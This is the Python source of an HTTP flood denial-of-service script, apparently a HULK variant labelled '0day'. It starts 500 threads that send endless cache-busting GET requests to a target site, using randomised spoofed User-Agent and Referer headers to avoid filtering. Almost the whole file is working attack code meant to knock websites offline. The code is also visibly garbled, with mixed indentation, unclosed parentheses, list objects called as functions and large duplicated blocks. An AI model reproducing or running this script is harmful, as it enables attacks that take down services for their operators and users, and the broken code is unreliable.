import urllib2

import sys

import threading

import random

import re



#global params

url=''

host=''

headers_useragents=[]

headers_referers=[]

request_counter=0

flag=0

safe=0



def inc_counter():

	global request_counter

	request_counter+=1



def set_flag(val):

	global flag

	flag=val



def set_safe():

	global safe

	safe=1

	

# generates a user agent array

def useragent_list():

	global headers_useragents

	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')

	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')

	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')

	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')

	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	
    headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	
    headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	
    headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	
    headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6'
	
	headers_useragents("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")

	headers_useragents("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")

	headers_useragents("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")

	headers_useragents("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")

	headers_useragents("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")

	headers_useragents("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")	

	return(headers_useragents)



# generates a referer array

def referer_list():

	global headers_referers

	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
    headers_referers.append('http://vk.com/profile.php?redirect=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
    headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
    headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
    headers_referers.append('http://yandex.ru/yandsearch?text=')
    headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
    headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
    headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
    headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
    headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
    headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
    headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
    headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
    headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
    headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
    headers_referers.append('http://help.baidu.com/searchResult?keywords=')
    headers_referers.append('http://www.bing.com/search?q=')
    headers_referers.append('https://www.yandex.com/yandsearch?text=')
    headers_referers.append('https://duckduckgo.com/?q=')
    headers_referers.append('http://www.ask.com/web?q=')
    headers_referers.append('http://search.aol.com/aol/search?q=')
    headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
    headers_referers.append('http://host-tracker.com/check_page/?furl=')
    headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
    headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
    headers_referers.append('https://add.my.yahoo.com/rss?url=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('https://steamcommunity.com/market/search?q=')
    headers_referers.append('http://filehippo.com/search?q=')
    headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    headers_referers.append('http://eu.battle.net/wow/en/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://careers.gatesfoundation.org/search?q=')
    headers_referers.append('http://techtv.mit.edu/search?q=')
    headers_referers.append('http://www.ustream.tv/search?q=')
    headers_referers.append('http://www.ted.com/search?q=')
    headers_referers.append('http://funnymama.com/search?q=')
    headers_referers.append('http://itch.io/search?q=')
    headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
    headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
    headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    headers_referers.append('http://www.reddit.com/search?q=')
    headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
    headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
    headers_referers.append('http://jobs.leidos.com/search?q=')
    headers_referers.append('http://jobs.bloomberg.com/search?q=')
    headers_referers.append('https://www.pinterest.com/search/?q=')
    headers_referers.append('http://millercenter.org/search?q=')
    headers_referers.append('https://www.npmjs.com/search?q=')
    headers_referers.append('http://www.evidence.nhs.uk/search?q=')
    headers_referers.append('http://www.shodanhq.com/search?q=')
    headers_referers.append('http://ytmnd.com/search?q=')
    headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
    headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
    headers_referers.append('http://www.google.com/translate?u=')
    headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
    headers_referers.append('http://help.baidu.com/searchResult?keywords=')
    headers_referers.append('http://www.bing.com/search?q=')
    headers_referers.append('https://add.my.yahoo.com/rss?url=')
    headers_referers.append('https://play.google.com/store/search?q=')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')                                       
    headers_referers.append('http://www.usatoday.com/search/results?q=')                       
    headers_referers.append('http://engadget.search.aol.com/search?q=')                        
    headers_referers.append('http://www.google.com/?q=')                                       
    headers_referers.append('http://www.usatoday.com/search/results?q=')                       
    headers_referers.append('http://engadget.search.aol.com/search?q=')                        
    headers_referers.append('http://www.bing.com/search?q=')                                   
    headers_referers.append('http://search.yahoo.com/search?p=')                               
    headers_referers.append('http://www.ask.com/web?q=')
    headers_referers.append('http://search.lycos.com/web/?q=')
    headers_referers.append('http://busca.uol.com.br/web/?q=')
    headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
    headers_referers.append('http://www.dmoz.org/search/search?q=')
    headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
    headers_referers.append('http://yandex.ru/yandsearch?text=')
    headers_referers.append('http://www.zhongsou.com/third?w=')
    headers_referers.append('http://hksearch.timway.com/search.php?query=')
    headers_referers.append('http://find.ezilon.com/search.php?q=')
    headers_referers.append('http://www.sogou.com/web?query=')
    headers_referers.append('http://api.duckduckgo.com/html/?q=')
    headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://duckduckgo.com/'
	headers_referers.append('http://duckduckgo.com/facebook.com/'
	headers_referers.append('http://duckduckgo.com/instagram.com/'
	headers_referers.append('http://duckduckgo.com/snapchat.com/'
	headers_referers.append('http://duckduckgo.com/sing.com/'
	headers_referers.append('http://duckduckgo.com/msi.com/'
	
	headers_referers.append('http://' + host + '/')
	
    headers_referers.append('https://' + host + '/')


	return(headers_referers)

	

#builds random ascii string

def buildblock(size):

	out_str = ''

	for i in range(0, size):

		a = random.randint(65, 90)

		out_str += chr(a)

	return(out_str)



def usage():

	print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

	print 'USAGE: python 0day <url>'

	print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'



	

#http request

def httpcall(url):

	useragent_list()

	referer_list()

	code=0

	if url.count("?")>0:

		param_joiner="&"

	else:

		param_joiner="?"

	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))

	request.add_header('User-Agent', random.choice(headers_useragents))

	request.add_header('Cache-Control', 'no-cache')

	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')

	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))

	request.add_header('Keep-Alive', random.randint(110,120))

	request.add_header('Connection', 'keep-alive')

	request.add_header('Host',host)

	try:

			urllib2.urlopen(request)

	except urllib2.HTTPError, e:

			#print e.code

			set_flag(1)

			print 'Response Code 500'

			code=800

	except urllib2.URLError, e:

			#print e.reason

			sys.exit()

	else:

			inc_counter()

			urllib2.urlopen(request)

	return(code)		



	

#http caller thread 

class HTTPThread(threading.Thread):

	def run(self):

		try:

			while flag<2:

				code=httpcall(url)

				if (code==800) & (safe==1):

					set_flag(2)

		except Exception, ex:

			pass



# monitors http threads and counts requests

class MonitorThread(threading.Thread):

	def run(self):

		previous=request_counter

		while flag==0:

			if (previous+100<request_counter) & (previous<>request_counter):

				print "%d Requests Sent" % (request_counter)

				previous=request_counter

		if flag==2:

			print "\n0Day Attack Finished Goodbye..."



#execute 

if len(sys.argv) < 2:

	usage()

	sys.exit()

else:

	if sys.argv[1]=="help":

		usage()

		sys.exit()

	else:

		print "0Day Attack Started..."

		if len(sys.argv)== 3:

			if sys.argv[2]=="safe":

				set_safe()

		url = sys.argv[1]

		if url.count("/")==2:

			url = url + "/"

		m = re.search('(https?\://)?([^/]*)/?.*', url)

		host = m.group(2)

		for i in range(500):

			t = HTTPThread()

			t.start()

		t = MonitorThread()

		t.start()